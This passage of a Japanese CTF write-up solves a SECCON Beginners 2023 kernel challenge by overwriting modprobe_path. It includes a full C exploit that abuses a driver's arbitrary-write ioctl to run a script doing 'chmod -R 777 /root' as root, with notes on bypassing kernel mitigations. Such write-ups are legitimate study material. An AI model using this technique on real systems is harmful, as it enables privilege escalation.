<h3 id="modprobe_path-の書き換えによる任意のスクリプト実行" style="position:relative;"><a href="#modprobe_path-%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%AB%E3%82%88%E3%82%8B%E4%BB%BB%E6%84%8F%E3%81%AE%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E5%AE%9F%E8%A1%8C" aria-label="modprobe_path の書き換えによる任意のスクリプト実行 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>modprobe_path の書き換えによる任意のスクリプト実行</h3>
<p>別解として modprobe_path の書き換えによる任意のスクリプト実行も試していきます。</p>
<p>エクスプロイトコードについては同じチームのメンバーが以下の Writeup に書いているものと丸パクリします。</p>
<p>参考：<a href="https://zenn.dev/t0m3y/articles/5ce152ac02da49#pwn-driver4b" target="_blank" rel="nofollow noopener noreferrer">SECCON Beginners CTF 2023 Writeup</a></p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_IOCTL_STORE</span> <span class="token expression"><span class="token number">0xC7F4B00</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CTF4B_IOCTL_LOAD</span>  <span class="token expression"><span class="token number">0xC7F4B01</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">modprobe_path_addr</span> <span class="token expression"><span class="token number">0xffffffff81e3a080</span> </span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> fd<span class="token punctuation">;</span> 
    <span class="token keyword">int</span> cmd<span class="token punctuation">;</span> 
    

    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ctf4b"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">char</span> evilpath<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/tmp/evil.sh"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CTF4B_IOCTL_STORE<span class="token punctuation">,</span> evilpath<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CTF4B_IOCTL_LOAD<span class="token punctuation">,</span> modprobe_path_addr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"ioctl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/evil.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\xde\xad\xbe\xef' > /tmp/pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/tmp/pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>このエクスプロイトを実行すると、Flag が存在している root ディレクトリ以下のファイルにアクセス権限 777 を割り当ててユーザ権限のシェルから読み取りできるようになります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 710px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/611f6c624c88ca58353d4ce522477210/7131f/image-20230610132444600.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 38.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABgElEQVQoz31SyVLCUBDMRUFx31dkFyVkIQkQCCCbgKIiuGNpWXrz/8/tzKTAG4epeTXvTU93z1Nu1CZqhxa6qQoakSK0YAxaICY5G4jK2VhMQF+IS/B5Vii/g288FfroJD1cJsqoh/O4CDuoHdlSa5wUZgLpkv/vlX6mIU3MUMCOHZhLSRghn1VuOTUFZMbZ+YhklfN8dAoqwPROefMGeMxfw9szpdnbM2CGknDWzlAlK/SgD8YWlHY0ePsm3G0NlYMcyruGP2yigAFf3Fvc6W046+doRot4sK9graRF9kf9ceqdTbXX0h0enCt5z333uQ50UqOHGMxnqfx0xxhXhjQ1K4zeq0MUNlUCdwVwshAeyCDPFMNcF8/FGwHMxnVoKWK6lYYRZMnlAUZ2DwOaypmjFXNxQUvJEwh7xnLVuQgxP0VhIwN7NS13bIu+Sh6vpYSpSB5ZPXw2nvDVehEv+5m6bLgdL6FJ38jfvv8DuMbLaxH7DmWuWUsExl+LrSE1f1g99EA5EAD+AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/611f6c624c88ca58353d4ce522477210/8ac56/image-20230610132444600.webp 240w,
/static/611f6c624c88ca58353d4ce522477210/d3be9/image-20230610132444600.webp 480w,
/static/611f6c624c88ca58353d4ce522477210/457aa/image-20230610132444600.webp 710w"
              sizes="(max-width: 710px) 100vw, 710px"
              type="image/webp"
            />
          <source
            srcset="/static/611f6c624c88ca58353d4ce522477210/8ff5a/image-20230610132444600.png 240w,
/static/611f6c624c88ca58353d4ce522477210/e85cb/image-20230610132444600.png 480w,
/static/611f6c624c88ca58353d4ce522477210/7131f/image-20230610132444600.png 710w"
            sizes="(max-width: 710px) 100vw, 710px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/611f6c624c88ca58353d4ce522477210/7131f/image-20230610132444600.png"
            alt="image-20230610132444600"
            title="image-20230610132444600"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ちなみに、modprobe<em>path</em>addr で定義しているアドレスについては gdb で<code class="language-text">/sbin/modprobe</code> の文字列を探すことで特定しています。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">search <span class="token string">"/sbin/modprobe"</span>
<span class="token operator">></span>
Searching <span class="token keyword">for</span> value: <span class="token string">'/sbin/modprobe'</span>
0xffff888001e3a080 <span class="token string">'/sbin/modprobe'</span>
0xffffffff81e3a080 <span class="token string">'/sbin/modprobe'</span></code></pre></div>
<h3 id="modprobe_path-とは" style="position:relative;"><a href="#modprobe_path-%E3%81%A8%E3%81%AF" aria-label="modprobe_path とは permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>modprobe_path とは</h3>
<p>modprobe<em>path って何ぞ？という話ですが、`__request</em>module` 関数という事前に登録された ELF や shebang に該当しない不明なプログラムを呼び出す際にコールされる関数内で呼び出されるモジュールのパスのようです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/*
	modprobe_path is set via /proc/sys.
*/</span>
<span class="token keyword">char</span> modprobe_path<span class="token punctuation">[</span>KMOD_PATH_LEN<span class="token punctuation">]</span> <span class="token operator">=</span> CONFIG_MODPROBE_PATH<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">__request_module</span><span class="token punctuation">(</span>bool wait<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	va_list args<span class="token punctuation">;</span>
	<span class="token keyword">char</span> module_name<span class="token punctuation">[</span>MODULE_NAME_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> ret<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * We don't allow synchronous module loading from async.  Module
	 * init may invoke async_synchronize_full() which will end up
	 * waiting for this task which already is waiting for the module
	 * loading to complete, leading to a deadlock.
	 */</span>
	<span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span>wait <span class="token operator">&amp;&amp;</span> <span class="token function">current_is_async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>modprobe_path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token operator">-</span>ENOENT<span class="token punctuation">;</span>

    <span class="token punctuation">{</span><span class="token punctuation">{</span> 中略 <span class="token punctuation">}</span><span class="token punctuation">}</span>
    
	ret <span class="token operator">=</span> <span class="token function">call_modprobe</span><span class="token punctuation">(</span>module_name<span class="token punctuation">,</span> wait <span class="token operator">?</span> UMH_WAIT_PROC <span class="token operator">:</span> UMH_WAIT_EXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kmod_concurrent_max<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wake_up</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kmod_wq<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">EXPORT_SYMBOL</span><span class="token punctuation">(</span>__request_module<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>参考：<a href="https://elixir.bootlin.com/linux/v6.2.3/source/kernel/kmod.c" target="_blank" rel="nofollow noopener noreferrer">kmod.c - kernel/kmod.c - Linux source code (v6.2.3) - Bootlin</a></p>
<p>この modprobe_path は通常書き込み可能領域で <code class="language-text">/sbin/modprobe</code> を既定値として登録されています。</p>
<p>つまり、このパスを改ざんすることでカーネルで任意のコマンド実行が可能になります。</p>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html#modprobe-path%E3%81%A8core-pattern" target="_blank" rel="nofollow noopener noreferrer">Holstein v2: Heap Overflowの悪用 | PAWNYABLE!</a></p>
<p>先ほどのエクスプロイトの例では、以下の行で Flag の存在するディレクトリの権限を書き換えるシェルスクリプトを作成し、実行権限を付与しています。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">system<span class="token punctuation">(</span><span class="token string">"echo -e '#!/bin/sh<span class="token entity" title="\n">\n</span>chmod -R 777 /root' > /tmp/evil.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
system<span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/evil.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>こちらのスクリプトについては正しく実行できる必要があるので、必ず shebang  を付与します。</p>
<p>続いて、0xdeadbeef などの適当なバイト列を埋め込んだファイルに実行権限を付与し、AAW を利用してカーネル内で実行させます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -e '\xde\xad\xbe\xef' > /tmp/pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /tmp/pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/tmp/pwn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>この時、<code class="language-text">/tmp/pwn</code> の実行は _<em>request</em>module によって処理された際に modprobe_path を呼び出すことになるので、<code class="language-text">/tmp/evil.sh</code> が実行されて root ディレクトリの権限が置き換わるというわけです。</p>
<h3 id="modprobe_path-の悪用が可能かどうか" style="position:relative;"><a href="#modprobe_path-%E3%81%AE%E6%82%AA%E7%94%A8%E3%81%8C%E5%8F%AF%E8%83%BD%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B" aria-label="modprobe_path の悪用が可能かどうか permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>modprobe_path の悪用が可能かどうか</h3>
<p>今回のように AAW の脆弱性を悪用できる場合、modprobe_path の悪用により任意のコード実行を実現できる可能性が高いようです。</p>
<p>modprobe<em>path の悪用自体は、SMAP や SMEP、または KPTI の緩和機構が入っていても利用することができますし、modprobe</em>path はデータセクションに存在するため FGKASLR が仮に有効化されていても影響を受けないようです。(KASLR ではない)</p>
<p>今回問題バイナリとして与えられた config ファイルを見ると、以下のように明示的に modprobe_path  に関する設定が与えられていました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># Static modprobe_path</span>
<span class="token assign-left variable">CONFIG_STATIC_USERMODEHELPER</span><span class="token operator">=</span>y
<span class="token assign-left variable">CONFIG_STATIC_USERMODEHELPER_PATH</span><span class="token operator">=</span><span class="token string">"/sbin/modprobe"</span></code></pre></div>
<p>参考：<a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/" target="_blank" rel="nofollow noopener noreferrer">Linux Kernel Exploitation Technique: Overwriting modprobe_path - Midas Blog</a></p>
<p>modprobe<em>path は call</em>usermodehelper の仕組みで呼び出されるものなので、<code class="language-text">CONFIG_STATIC_USERMODEHELPER=y</code> で有効化されている場合は悪用できると考えてよさそうです。</p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>Linux カーネルエクスプロイトへの初チャレンジでしたが、正直かなりしんどかったです笑</p>
<p>KPTI トランポリンを使う方法の Writeup が見当たらなかったので手探りで進めていたのですが、そのおかげでコンテスト中よりもだいぶ Linux カーネルに対する解像度が上がったような気がします。</p>
<p>Pwn もたまにやると楽しいですね。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jun 10, 2023</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/ctf/">CTF</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/pwn/">Pwn</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/ctf-sec4b-kernel-exploit";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-4527e0a718e3bd88d288.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-4527e0a718e3bd88d288.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-46fc1da9fa41dea5027d.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>